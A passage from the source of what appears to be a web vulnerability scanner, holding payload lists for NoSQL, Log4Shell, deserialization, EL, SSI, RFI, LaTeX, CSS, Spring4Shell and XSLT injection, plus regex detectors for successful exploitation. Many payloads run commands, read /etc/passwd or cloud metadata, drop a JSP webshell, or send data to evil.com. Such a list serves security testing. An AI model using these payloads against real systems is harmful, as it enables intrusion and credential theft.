        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwic3ViIjoiMSJ9.Rn1-SKF32BzXPL4XZiUlDBcZ3nxMEKtXhZhISMQaRQc",
        # Stripped signature (valid header+payload, empty sig)
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwic3ViIjoiMSJ9.",
    ],

    # ── NoSQL Injection (MongoDB, CouchDB, Cassandra) ──────────────────────
    "nosql_injection": [
        # MongoDB operator injection (JSON body)
        '{"$gt":""}', '{"$ne":null}', '{"$ne":""}',
        '{"$regex":".*"}', '{"$regex":"^a"}',
        '{"$exists":true}', '{"$exists":false}',
        '{"$gt":"","$lt":"z"}',
        '{"$in":["admin","root"]}',
        '{"$nin":[""]}',
        '{"$or":[{},{"a":"a"}]}',
        '{"$and":[{"$ne":""},{"$ne":null}]}',
        # MongoDB JS injection ($where)
        '{"$where":"this.password.match(/.*/)!=null"}',
        '{"$where":"sleep(100)"}',
        '{"$where":"1==1"}',
        "true, $where: '1 == 1'",
        "'; return true; var x='",
        "'; sleep(100); var x='",
        # MongoDB aggregation injection
        '{"$lookup":{"from":"users","localField":"_id","foreignField":"_id","as":"x"}}',
        # URL-encoded operator injection (query params)
        "[$ne]=1", "[$gt]=", "[$regex]=.*",
        "[$exists]=true", "[$in][0]=admin",
        # CouchDB
        '{"selector":{"$gt":null}}',
        '{"selector":{"_id":{"$gt":null}}}',
    ],

    # ── HTTP Parameter Pollution ────────────────────────────────────────────
    "hpp": [
        # Duplicate param values — different servers handle differently
        # These are templates; the fuzzer prefixes with the actual param name
        "HPP_ORIGINAL&{PARAM}=HPP_INJECTED",
        "{PARAM}=HPP_FIRST&{PARAM}=HPP_SECOND",
        "HPP_ORIGINAL&{PARAM}[]=HPP_ARRAY",
        "{PARAM}=1&{PARAM}=2&{PARAM}=3",
        "HPP_ORIGINAL%26{PARAM}%3dHPP_ENCODED",
        "{PARAM}=safe&{PARAM}=' OR '1'='1",
        "{PARAM}=safe&{PARAM}=<script>alert(1)</script>",
    ],

    # ── Host Header Injection ──────────────────────────────────────────────
    "host_header": [
        "evil.com", "evil.com:443",
        "localhost", "127.0.0.1",
        "evil.com\r\nX-Injected: header",
        "evil.com%0d%0aX-Injected:%20header",
        # Host header poisoning for cache / password reset
        "target.com@evil.com",
        "target.com:@evil.com",
        "evil.com#target.com",
        "evil.com\ttarget.com",
        "evil.com%00target.com",
        # X-Forwarded-Host and similar
        "X-Forwarded-Host: evil.com",
        "X-Host: evil.com",
        "X-Forwarded-Server: evil.com",
        "X-Original-URL: /admin",
        "X-Rewrite-URL: /admin",
        "X-Custom-IP-Authorization: 127.0.0.1",
        "X-Forwarded-For: 127.0.0.1",
        "X-Real-IP: 127.0.0.1",
        "Client-IP: 127.0.0.1",
    ],

    # ── Deserialization ────────────────────────────────────────────────────
    "deserialization": [
        # Java serialized object marker (base64 of aced0005)
        "rO0ABXNyABNqYXZhLnV0aWwuSGFzaFNldA==",
        # Java commons-collections gadget marker
        "rO0ABXNyADJvcmcuYXBhY2hlLmNvbW1vbnM=",
        # PHP serialized objects
        'O:8:"stdClass":0:{}',
        'a:1:{s:4:"test";s:4:"test";}',
        'O:4:"User":1:{s:4:"role";s:5:"admin";}',
        'O:7:"Example":0:{}',
        # PHP POP chain (Monolog/Guzzle/Laravel)
        'O:32:"Monolog\\Handler\\SyslogUdpHandler":1:{s:9:"*socket";s:0:"";}',
        # Python pickle
        "gASVDgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
        "cos\nsystem\n(S'id'\ntR.",
        # .NET ObjectStateFormatter / ViewState
        "/wEPDwUKMTkwNjc4NTIwMWRk",
        "AAEAAAD/////AQAAAAAAAAAE",
        # Node.js node-serialize
        '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}',
        # YAML deserialization
        "!!python/object/apply:os.system ['id']",
        '!!python/object/new:subprocess.check_output [["id"]]',
    ],

    # ── Log4Shell / JNDI Injection ─────────────────────────────────────────
    "log4shell": [
        "${jndi:ldap://evil.com/a}",
        "${jndi:rmi://evil.com/a}",
        "${jndi:dns://evil.com/a}",
        "${jndi:iiop://evil.com/a}",
        # Obfuscation variants (bypass WAF)
        "${${lower:j}ndi:${lower:l}dap://evil.com/a}",
        "${${upper:j}ndi:${upper:l}dap://evil.com/a}",
        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
        "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//evil.com/a}",
        "${j${::-n}di:ldap://evil.com/a}",
        "${jndi:ldap://127.0.0.1#evil.com/a}",
        "${jndi:ldap://evil.com:1389/a}",
        # Log4j lookup patterns (info leak without JNDI)
        "${java:version}", "${java:os}",
        "${env:PATH}", "${env:HOME}",
        "${sys:java.version}", "${sys:os.name}",
        "${date:YYYY-MM-dd}", "${hostName}",
    ],

    # ── Expression Language (EL) Injection ─────────────────────────────────
    "el_injection": [
        # Java EL / SpEL (Spring)
        "${7*7}", "#{7*7}",
        "${applicationScope}",
        "#{T(java.lang.Runtime).getRuntime()}",
        "#{T(java.lang.System).getenv()}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "${pageContext.request.getSession()}",
        "${sessionScope}",
        # SpEL specific
        "#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\\\A').next()}",
        "${new java.lang.ProcessBuilder({'id'}).start()}",
        # JSP EL
        "${header}", "${cookie}", "${param}",
        "${applicationScope}", "${requestScope}",
        # OGNL (Apache Struts)
        "%{7*7}",
        "%{(#rt=@java.lang.Runtime@getRuntime())}",
        "${#_memberAccess.allowStaticMethodAccess=true}",
        # Additional SpEL
        "#{T(java.lang.Math).random()}",
        "${T(java.lang.Class).forName('java.lang.Runtime')}",
        "#{new java.io.File('/etc/passwd').exists()}",
        # MVEL (JBoss, Mule)
        "${Runtime.getRuntime().exec('id')}",
        "Runtime.getRuntime().exec('id')",
        # JSF EL
        "#{facesContext.getExternalContext()}",
        "#{request.getClass().getClassLoader()}",
    ],

    # ── HTTP Verb Tampering payloads (used by _fuzz_verb_tamper) ──────────
    "verb_tamper": [
        "GET", "POST", "PUT", "PATCH", "DELETE",
        "OPTIONS", "TRACE", "HEAD",
        "PROPFIND", "MOVE", "COPY", "LOCK", "UNLOCK",
        "MKCOL", "CONNECT",
    ],

    # ── Web Cache Poisoning ────────────────────────────────────────────────
    "cache_poisoning": [
        # Unkeyed header values that may be reflected
        "X-Forwarded-Host: evil.com",
        "X-Forwarded-Scheme: nothttps",
        "X-Original-URL: /admin",
        "X-Rewrite-URL: /secret",
        "X-Forwarded-Prefix: /evil",
        # Cache key normalization tricks
        "X-HTTP-Method-Override: POST",
        "X-Forwarded-Port: 1234",
        "X-Cache-Key: evil",
    ],

    # ── SSI Injection ─────────────────────────────────────────────────────
    "ssi_injection": [
        '<!--#exec cmd="id"-->',
        '<!--#exec cmd="ls"-->',
        '<!--#exec cmd="cat /etc/passwd"-->',
        '<!--#include virtual="/etc/passwd"-->',
        '<!--#include file="/etc/passwd"-->',
        '<!--#echo var="DOCUMENT_ROOT"-->',
        '<!--#echo var="SERVER_SOFTWARE"-->',
        '<!--#echo var="DATE_LOCAL"-->',
        '<!--#printenv-->',
        '<!--#config errmsg="DAST-SSI-DETECTED"-->',
        '<!--#set var="DAST" value="SSI_WORKS"-->',
        '<!--#exec cgi="/cgi-bin/test"-->',
    ],

    # ── Remote File Inclusion (RFI) ───────────────────────────────────────
    "rfi": [
        "http://evil.com/shell.txt",
        "https://evil.com/shell.txt",
        "http://evil.com/shell.txt%00",
        "http://evil.com/shell.txt?",
        "//evil.com/shell.txt",
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:80/",
        "ftp://evil.com/shell.txt",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        "expect://id",
        "php://input",
        "php://filter/convert.base64-encode/resource=index",
        "dict://evil.com:1234/",
        "gopher://evil.com:1234/_",
        "jar:http://evil.com/shell.jar!/",
    ],

    # ── Format String Injection ───────────────────────────────────────────
    "format_string": [
        "%s%s%s%s%s%s%s%s%s%s",
        "%x%x%x%x%x%x%x%x",
        "%n%n%n%n%n%n",
        "%p%p%p%p%p%p%p%p",
        "%d%d%d%d%d%d%d%d",
        "%08x.%08x.%08x.%08x",
        "AAAA%p%p%p%p",
        "%s" * 20,
        "{0}{1}{2}{3}{4}",           # Python format string
        "${7*7}",                     # Expression overlap
        "%.16705x%hn",
        "%1$s%2$s%3$s%4$s",          # POSIX positional
    ],

    # ── LaTeX Injection ──────────────────────────────────────────────────
    "latex_injection": [
        # File read via \input{}
        r"\input{/etc/passwd}",
        r"\input{/etc/shadow}",
        r"\input{/proc/self/environ}",
        r"\input{C:/Windows/win.ini}",
        r"\include{/etc/passwd}",
        # Newcommand + expansion trick (bypasses simple blacklists)
        r"\newcommand{\x}{\input{/etc/passwd}}$\x$",
        r"\newcommand{\y}{\catcode`\@=11\input{/etc/passwd}}\y",
        # RCE via \write18 (requires shell_escape)
        r"\write18{id > /tmp/dast_out.txt}",
        r"\write18{cat /etc/passwd}",
        r"\immediate\write18{id}",
        r"\immediate\write18{whoami}",
        # Read via \verbatiminput
        r"\verbatiminput{/etc/passwd}",
        r"\lstinputlisting{/etc/passwd}",
        # Canary for detection without shell
        r"\typeout{DAST-LATEX-PROBE}",
        r"\errmessage{DAST-LATEX-ERROR-PROBE}",
    ],

    # ── CSS Injection / Attribute Selector Exfiltration ──────────────────
    "css_injection": [
        # Attribute selector + DNS/URL callback exfiltration
        "input[name='csrf_token'][value^='a']{background:url('https://evil.com/a')}",
        "input[name='csrf_token'][value^='b']{background:url('https://evil.com/b')}",
        "*{background:url('https://evil.com/cssinjected')}",
        # Style block breakout / injection
        "</style><style>*{color:red}",
        "}{color:red}a{",
        "}body{background:url('https://evil.com/css_exfil')}a{",
        # @import exfiltration
        "@import url('https://evil.com/cssimport');",
        # expression() RCE (IE only, for legacy detection)
        "{background:expression(alert(1))}",
        # @charset injection
        "@charset 'utf-8'; * { background: url('https://evil.com/charset') }",
        # Variable injection
        "--x:url('https://evil.com/cssvar');background:var(--x)",
    ],

    # ── Spring4Shell (CVE-2022-22965) + Text4Shell (CVE-2022-42889) ──────
    "spring4shell": [
        # Spring4Shell — Spring MVC DataBinder class.module.classLoader chain
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22))){%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20%7D%25%7Bc1%7Di",
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
        "class.module.classLoader.resources.context.parent.pipeline.first.directory=/tmp",
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix=dast_probe",
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
        # Simplified DataBinder probes (detect reflection errors)
        "class.classLoader.defaultAssertionStatus=false",
        "class.forName=java.lang.Runtime",
        # Text4Shell — Apache Commons Text interpolation (CVE-2022-42889)
        "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
        "${script:groovy:'id'.execute().text}",
        "${url:UTF-8:http://evil.com}",
        "${dns:address|evil.com}",
        # Commons Text lookup variants
        "${base64Decoder:SGVsbG8gV29ybGQ=}",
        "${java:version}",
        "${sys:java.version}",
        "${env:HOME}",
    ],

    # ── XSLT Injection ───────────────────────────────────────────────────
    "xslt_injection": [
        # File read via document()
        '<?xml version="1.0"?><xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"><xsl:template match="/"><xsl:value-of select="document(\'/etc/passwd\')"/></xsl:template></xsl:stylesheet>',
        # Minimal probe (inject into xsl:value-of select)
        "<xsl:value-of select=\"document('/etc/passwd')\"/>",
        "<xsl:value-of select=\"document('file:///etc/passwd')\"/>",
        "<xsl:value-of select=\"document('file:///proc/self/environ')\"/>",
        # PHP function execution via XSLT (PHP Saxon/Sablotron)
        "<xsl:value-of select=\"php:function('exec', 'id')\"/>",
        "<xsl:value-of select=\"php:function('passthru', 'id')\"/>",
        "<xsl:value-of select=\"php:functionString('file_get_contents', '/etc/passwd')\"/>",
        # Java extension — XSLT via JAXP
        "<xsl:value-of select=\"java:java.lang.System.getenv('PATH')\"/>",
        # Error-based detection
        "<xsl:value-of select=\"1 div 0\"/>",
        # SSRF via document()
        "<xsl:value-of select=\"document('http://169.254.169.254/latest/meta-data/')\"/>",
        "<xsl:value-of select=\"document('http://evil.com/xslt_ssrf')\"/>",
        # XXE via XSLT entity
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><xsl:value-of select="$xxe"/>',
        # Canary
        "<xsl:value-of select=\"'DAST-XSLT-PROBE'\"/>",
    ],

    # ── Dangling Markup Injection ─────────────────────────────────────────
    "dangling_markup": [
        "<img src='//evil.com/dm?d=",
        '<img src="//evil.com/dm?d=',
        "<svg><use href='//evil.com/svgdm#",
        "<base href='//evil.com/'>",
        "<form action='//evil.com/capture'>",
        "<link rel=preload href='//evil.com/dm?d=",
    ],

    # ── XML Injection (beyond XXE) ────────────────────────────────────────
    "xml_injection": [
        "<foo>bar</foo>",
        "]]>",                        # CDATA breakout
        "<?xml version=\"1.0\"?>",
        "<![CDATA[<script>alert(1)</script>]]>",
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "<!--",                       # Comment injection
        "<x xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"/etc/passwd\"/></x>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<a xmlns:a='http://evil.com'>",
        "&amp;&lt;&gt;&quot;&apos;",  # Entity encoding
        "<![CDATA[#{7*7}]]>",
        "<?foo bar?>",                # Processing instruction
    ],
}

# Detection signatures per vuln class
DETECTORS: dict[str, list[tuple[str, str]]] = {
    "sqli_error": [
        # MySQL / MariaDB
        (r"you have an error in your sql", "MySQL error — SQL injection likely confirmed"),
        (r"warning: mysql_", "PHP MySQL error — SQL injection point exposed"),
        (r"supplied argument is not a valid MySQL", "MySQL injection error"),
        (r"mysql_num_rows\(\)", "PHP MySQL function exposed"),
        (r"Column count doesn't match", "MySQL UNION injection — column count mismatch"),
        (r"Unknown column '.*' in", "MySQL unknown column — injection confirmed"),
        (r"Table '.*' doesn't exist", "MySQL table error — injection point"),
        (r"MariaDB server version", "MariaDB error — SQL injection confirmed"),
        # PostgreSQL
        (r"PSQLException",   "PostgreSQL error — SQL injection likely confirmed"),
        (r"pg_query\(\)",    "PostgreSQL query error — injection point"),
        (r"unterminated quoted string", "PostgreSQL syntax error — injection confirmed"),
        (r"ERROR:\s+syntax error at or near", "PostgreSQL syntax error — injection point"),
        (r"invalid input syntax for (?:type\s+)?(?:integer|numeric)", "PostgreSQL type cast error — injection"),
        # Oracle
        (r"ORA-\d+",         "Oracle DB error — SQL injection likely confirmed"),
        (r"oracle.*driver",  "Oracle driver error — injection point"),
        (r"quoted string not properly terminated", "Oracle syntax error — injection"),
        # MSSQL
        (r"Microsoft SQL.*Native Client", "MSSQL error — SQL injection confirmed"),
        (r"Unclosed quotation mark",      "MSSQL syntax error — SQL injection confirmed"),
        (r"ODBC SQL Server Driver",       "MSSQL ODBC error — injection confirmed"),
        (r"SQL Server.*?\d+",             "MSSQL server error — injection point"),
        (r"Incorrect syntax near",        "MSSQL syntax error — injection confirmed"),
        # SQLite
        (r"sqlite_",         "SQLite error — SQL injection likely confirmed"),
        (r"SQLITE_ERROR",    "SQLite error code — injection confirmed"),
        (r"near \".*\": syntax error", "SQLite syntax error — injection point"),
        # DB2
        (r"DB2 SQL error",   "IBM DB2 error — SQL injection confirmed"),
        (r"SQLCODE=-\d+",    "DB2 SQLCODE error — injection point"),
        # H2 / CockroachDB / Firebird / Informix / Sybase
        (r"org\.h2\.jdbc",   "H2 Database error — injection confirmed"),
        (r"node is not ready", "CockroachDB error — injection point"),
        (r"Dynamic SQL Error", "Firebird SQL error — injection confirmed"),
        (r"com\.informix\.jdbc", "Informix JDBC error — injection point"),
        (r"Sybase message",  "Sybase error — injection confirmed"),
        # Framework / driver errors
        (r"java\.sql\.SQLException", "JDBC exception — SQL injection point"),
        (r"SQLSTATE\[\w+\]", "PDO/ODBC SQLSTATE error — injection confirmed"),
        (r"PG::SyntaxError", "Ruby pg gem — PostgreSQL injection error"),
        (r"ActiveRecord::StatementInvalid", "Rails SQL error — injection confirmed"),
        (r"django\.db\.utils", "Django ORM SQL error — injection point"),
        (r"System\.Data\.SqlClient", "ASP.NET SQL error — injection confirmed"),
        (r"Microsoft OLE DB Provider", "OLE DB provider error — injection"),
        (r"sql syntax.*?error", "Generic SQL syntax error — injection point"),
        # MongoDB / NoSQL
        (r"MongoError",      "MongoDB error — NoSQL injection confirmed"),
        (r"\$err.*?not.*?valid", "MongoDB query error — NoSQL injection point"),
    ],
    "xss_stored":        [],  # detected by canary verification (inject → re-fetch)
    "xss_second_order":  [],  # detected by re-fetch on re-render pages
    "xss_blind":         [],  # detected by OAST out-of-band callback
    "sqli_bool_true":  [],  # detected by differential response analysis
    "sqli_bool_false": [],  # detected by differential response analysis
    "sqli_blind_time": [],  # detected by response time delta
    "sqli_union": [
        (r"dast7371",                                       "UNION SQLi confirmed — injected canary reflected"),
        (r"(?:5\.\d+\.\d+|8\.\d+\.\d+)-(?:MySQL|MariaDB)", "UNION SQLi — MySQL/MariaDB version extracted"),
        (r"PostgreSQL\s+\d+\.\d+",                         "UNION SQLi — PostgreSQL version extracted"),
        (r"Microsoft SQL Server\s+\d{4}",                  "UNION SQLi — MSSQL version extracted"),
        (r"Oracle Database\s+\d+[a-z]?\s+",                "UNION SQLi — Oracle version extracted"),
        (r"SQLite\s+version\s+\d+\.\d+",                   "UNION SQLi — SQLite version extracted"),
    ],
    "xss_reflected": [
        # Script tag variants
        (r"<script[^>]*>alert\(1\)</script>",  "Reflected XSS confirmed — script tag unescaped"),
        (r"<script[^>]*>confirm\(1\)</script>", "Reflected XSS confirmed — confirm() reflected"),
        (r"<script[^>]*>prompt\(1\)</script>",  "Reflected XSS confirmed — prompt() reflected"),
        (r"<script[^>]*>alert`1`</script>",     "Reflected XSS confirmed — backtick invocation"),
        (r"<script\s+src=",                     "Reflected XSS — external script injection"),
        # Event handler variants
        (r"onerror\s*=\s*alert\(1\)",           "Reflected XSS confirmed — onerror unescaped"),
        (r"onload\s*=\s*alert\(1\)",            "Reflected XSS — onload handler reflected"),
        (r"onfocus\s*=\s*alert\(1\)",           "Reflected XSS — onfocus handler reflected"),
        (r"onmouseover\s*=\s*alert\(1\)",       "Reflected XSS — onmouseover reflected"),
        (r"ontoggle\s*=\s*alert\(1\)",          "Reflected XSS — ontoggle reflected"),
        (r"onbegin\s*=\s*alert\(1\)",           "Reflected XSS — SVG animate onbegin reflected"),
        (r"onstart\s*=\s*alert\(1\)",           "Reflected XSS — marquee onstart reflected"),
        # Tag-specific
        (r"<svg[/\s]onload",                    "Reflected XSS — SVG onload tag reflected"),
        (r"<img[/\s][^>]*onerror",              "Reflected XSS — img onerror tag reflected"),
        (r"<iframe[^>]*srcdoc",                 "Reflected XSS — iframe srcdoc injection"),
        (r"<embed[^>]*src\s*=\s*javascript:",   "Reflected XSS — embed javascript: src"),
        # Protocol handlers
        (r"javascript:\s*alert\(1\)",           "Reflected XSS — javascript: URI reflected"),
        (r"javascript:\s*alert\(document",      "Reflected XSS — javascript: domain/cookie steal"),
        (r"data:text/html",                     "Reflected XSS — data: URI injection"),
        # Framework template injection
        (r"\{\{.*constructor.*\}\}",            "Reflected XSS — AngularJS template injection"),
        (r"\{\{alert\(1\)\}\}",                 "Template XSS — expression reflected unescaped"),
        # Encoding bypass detection
        (r"&#\d+;.*alert",                      "Reflected XSS — HTML entity encoded payload reflected"),
        (r"\\x3cscript",                        "Reflected XSS — hex escaped script tag reflected"),
    ],
    "lfi": [
        (r"root:x:0:0:",                 "LFI CONFIRMED — /etc/passwd readable"),
        (r"root:\*:0:0:",                "LFI CONFIRMED — /etc/passwd readable"),
        (r"/bin/bash(?:\s|\"|\n|$)",     "LFI confirmed — shell path visible"),
        (r"\[fonts\]",                   "LFI CONFIRMED — Windows win.ini readable"),
        (r"\[extensions\]",              "LFI confirmed — Windows ini file readable"),
        (r"PHP Version",                 "LFI to phpinfo — PHP info exposed"),
        (r"daemon:x:",                   "LFI confirmed — /etc/passwd content visible"),
        (r"PATH=/(?:usr|bin|sbin|home)",  "LFI confirmed — /proc/self/environ readable"),
    ],
    "cmdi": [
        # ── Linux command output ─────────────────────────────────────────
        (r"uid=\d+\(",                          "COMMAND INJECTION CONFIRMED — id output in response"),
        (r"uid=0\(root\)",                      "COMMAND INJECTION AS ROOT — full system compromise"),
        (r"CMDI_CONFIRMED",                     "Command injection confirmed — echo payload returned"),
        (r"(?m)^root\s*$",                      "Command injection confirmed — whoami=root"),
        (r"Linux.*#\d+",                        "Command injection — uname output visible"),
        (r"root:x:0:0:",                        "Command injection — /etc/passwd in response"),
        (r"total \d+\s+drwx",                   "Command injection — ls -la directory listing"),
        (r"(?m)^/bin/(?:bash|sh)\s*$",           "Command injection — shell path as standalone output line"),
        (r"(?m)^(www-data|apache|nginx|nobody)", "Command injection — service user whoami"),
        # ── Windows command output ───────────────────────────────────────
        (r"Microsoft Windows",                  "Command injection — Windows version in response"),
        (r"Directory of [A-Z]:\\",              "Command injection — Windows dir listing"),
        (r"\[fonts\]",                          "Command injection — win.ini content visible"),
        (r"Windows IP Configuration",           "Command injection — ipconfig output visible"),
        (r"(?m)^User accounts for",             "Command injection — net user output visible"),
        (r"Subnet Mask.*255\.",                 "Command injection — ipconfig network info leaked"),
        (r"(?m)^Host Name:",                    "Command injection — systeminfo output visible"),
        (r"OS Version:.*Windows",               "Command injection — systeminfo OS version"),
        (r"(?m)^\\\\",                          "Command injection — UNC path in response"),
        # ── PowerShell output ────────────────────────────────────────────
        (r"PSPath\s*:",                         "Command injection — PowerShell object output"),
        (r"(?m)^[A-Z]:\\Users\\",               "Command injection — PowerShell path output"),
        # ── Error-based detection (command not found = still confirms injection) ──
        (r"sh: \d+: .+: not found",            "Command injection — sh error confirms execution"),
        (r"bash: .+: command not found",        "Command injection — bash error confirms execution"),
        (r"'.*' is not recognized as an internal", "Command injection — cmd.exe error confirms execution"),
        (r"The term '.*' is not recognized",    "Command injection — PowerShell error confirms execution"),
        (r"cannot execute binary file",         "Command injection — binary execution attempted"),
    ],
    "ssti": [
        # ── Arithmetic confirmation (all engines) ────────────────────────
        (r"\b1787569\b",                        "SSTI CONFIRMED — 1337*1337=1787569 evaluated (high-confidence)"),
        (r"(?<![0-9])49(?![0-9])(?=\D{0,20}(?:49|template|render|jinja|twig|freemarker))", "SSTI possible — 49 with template context"),
        (r"\b7777777\b",                        "SSTI confirmed — 7*'7'='7777777' Jinja2 string repeat"),
        # ── Python engines (Jinja2, Mako, Tornado) ──────────────────────
        (r"<Config ",                           "SSTI — Flask config object leaked"),
        (r"<class '",                           "SSTI — Python class objects exposed"),
        (r"Traceback \(most recent",            "SSTI error — Python traceback visible"),
        (r"__builtins__",                       "SSTI — Python builtins object exposed"),
        (r"<module 'os'",                       "SSTI — Python os module leaked"),
        (r"Mako Runtime Error",                 "SSTI error — Mako template engine"),
        # ── PHP engines (Twig, Smarty) ──────────────────────────────────
        (r"Twig_Error",                         "SSTI error — Twig template engine"),
        (r"Twig\\Error",                        "SSTI error — Twig template (namespaced)"),
        (r"Smarty Compiler:",                   "SSTI error — Smarty template engine"),
        (r"Smarty_Internal_",                   "SSTI — Smarty internal class exposed"),
        (r"Uncaught SmartyException",           "SSTI error — Smarty exception"),
        # ── Java engines (Freemarker, Velocity, Pebble, Thymeleaf, EL) ──
        (r"freemarker\.template\.",             "SSTI error — Freemarker template engine"),
        (r"freemarker\.core\.",                 "SSTI error — Freemarker core"),
        (r"org\.apache\.velocity",              "SSTI error — Velocity template engine"),
        (r"com\.mitchellbosecke\.pebble",       "SSTI error — Pebble template engine"),
        (r"org\.thymeleaf\.exceptions",         "SSTI error — Thymeleaf template engine"),
        (r"javax\.el\.ELException",             "SSTI error — Java EL expression"),
        (r"ognl\.OgnlException",                "SSTI error — OGNL expression (Struts)"),
        (r"java\.lang\.Runtime",                "SSTI — Java Runtime class exposed"),
        (r"java\.lang\.ProcessBuilder",         "SSTI — Java ProcessBuilder exposed"),
        # ── Node.js engines (Pug, Handlebars, Nunjucks, Dust) ───────────
        (r"Template render error",              "SSTI error — Node.js template engine"),
        (r"PugException",                       "SSTI error — Pug/Jade template engine"),
        (r"nunjucks\.runtime\.Error",           "SSTI error — Nunjucks template engine"),
        (r"Handlebars\.Exception",              "SSTI error — Handlebars template engine"),
        (r"dust\.helpers",                      "SSTI — Dust.js helpers exposed"),
        # ── Ruby engines (ERB, Slim) ────────────────────────────────────
        (r"SyntaxError.*erb",                   "SSTI error — ERB template (Ruby)"),
        (r"ActionView::Template::Error",        "SSTI error — Rails template engine"),
        # ── Go templates ────────────────────────────────────────────────
        (r"template: .+: executing",            "SSTI error — Go template engine"),
        (r"html/template:.+error",              "SSTI error — Go html/template"),
        # ── .NET Razor ──────────────────────────────────────────────────
        (r"RazorEngine",                        "SSTI error — .NET Razor engine"),
        (r"System\.Web\.HttpCompileException",  "SSTI error — .NET template compilation"),
        (r"System\.Diagnostics\.Process",       "SSTI — .NET Process class exposed"),
    ],
    "ssrf": [
        # AWS IMDS — ami-id and instance-id only appear in specific metadata API format
        (r"ami-[0-9a-f]{8,17}",                     "SSRF CONFIRMED — AWS AMI ID from metadata service"),
        (r'"instanceId"\s*:\s*"i-[0-9a-f]{8,17}"',  "SSRF CONFIRMED — AWS instance ID in metadata JSON"),
        (r"iam/security-cred",                       "SSRF CRITICAL — AWS IAM credentials endpoint accessible"),
        (r'"AccessKeyId"\s*:\s*"AK[A-Z0-9]{18}"',   "SSRF CRITICAL — AWS IAM access key exposed"),
        # GCP metadata
        (r'"computeMetadata"',                       "SSRF confirmed — GCP metadata endpoint accessible"),
        (r'"serviceAccounts"\s*:',                   "SSRF confirmed — GCP service account metadata"),
        # Internal services
        (r"SSH-\d+\.\d+-OpenSSH",                    "SSRF confirmed — internal SSH service banner"),
        (r"redis_version:\d+\.\d+",                  "SSRF confirmed — internal Redis INFO response"),
        (r'"cluster_name"\s*:\s*"',                  "SSRF confirmed — internal Elasticsearch cluster"),
        (r"\+OK\s+.*Redis",                          "SSRF confirmed — Redis PONG response"),
    ],
    "open_redirect": [
        # ── Body-based redirect sinks — payload echo + baseline gates in detection loop ──
        #
        # Rules:
        #  1. Every pattern MUST contain evil\.com — payload echo required.
        #  2. Anchored to specific executable redirect sinks only.
        #  3. Three-gate guard in detection loop catches remaining false positives.
        #
        # ── Meta refresh ──────────────────────────────────────────────────────
        (r"<meta[^>]*http-equiv\s*=\s*['\"]?refresh['\"]?[^>]*content\s*=\s*['\"][^'\"]*evil\.com",
            "Open redirect — meta refresh content= redirects to evil.com"),
        (r"content\s*=\s*['\"][\d.]+\s*;\s*url\s*=\s*(?:https?:)?//[^'\"]*evil\.com",
            "Open redirect — meta refresh URL value contains evil.com"),
        # ── JavaScript location assignment ────────────────────────────────────
        (r"(?:window|document)\.location\s*=\s*['\"][^'\"]*evil\.com",
            "Open redirect — JS window/document.location assigned to evil.com"),
        (r"window\.location\.href\s*=\s*['\"][^'\"]*evil\.com",
            "Open redirect — JS location.href set to evil.com"),
        (r"window\.location\.replace\s*\(\s*['\"][^'\"]*evil\.com",
            "Open redirect — JS location.replace() called with evil.com"),
        (r"window\.location\.assign\s*\(\s*['\"][^'\"]*evil\.com",
            "Open redirect — JS location.assign() called with evil.com"),
        (r"window\.open\s*\(\s*['\"][^'\"]*evil\.com",
            "Open redirect — JS window.open() to evil.com"),
        # ── SPA routing APIs ──────────────────────────────────────────────────
        (r"history\.(?:push|replace)State\s*\([^)]*evil\.com",
            "Open redirect — JS history.pushState/replaceState to evil.com"),
        (r"(?:this\.\$?router|useRouter|Router)\.(?:push|replace)\s*\(['\"][^'\"]*evil\.com",
            "Open redirect — SPA router.push/replace to evil.com"),
        # ── Injected link redirect ────────────────────────────────────────────
        # Only flag <a href=...> when the href directly contains evil.com (not a relative link)
        (r"<a\s[^>]*href\s*=\s*['\"](?:https?:)?//[^'\"]*evil\.com",
            "Open redirect — injected <a href> pointing to evil.com"),
        # ── Refresh header value reflected in body ────────────────────────────
        (r"(?:Refresh|refresh)\s*:\s*[\d.]+\s*;\s*(?:url|URL)\s*=[^\"'<\r\n]*evil\.com",
            "Open redirect — Refresh header value reflected with evil.com"),
    ],
    "xxe": [
        # ── Linux file content ───────────────────────────────────────────
        (r"root:x:0:0:",                        "XXE CONFIRMED — /etc/passwd readable via XML"),
        (r"daemon:x:",                          "XXE confirmed — system file readable"),
        (r"Linux version \d+\.\d+",             "XXE confirmed — /proc/version leaked"),
        (r"HOME=/",                             "XXE confirmed — /proc/self/environ leaked"),
        # ── Windows file content ─────────────────────────────────────────
        (r"\[fonts\]",                          "XXE CONFIRMED — win.ini readable via XML"),
        (r"\[boot loader\]",                    "XXE confirmed — boot.ini readable"),
        (r"# Copyright.*Microsoft",             "XXE confirmed — Windows hosts file readable"),
        # ── Cloud metadata ───────────────────────────────────────────────
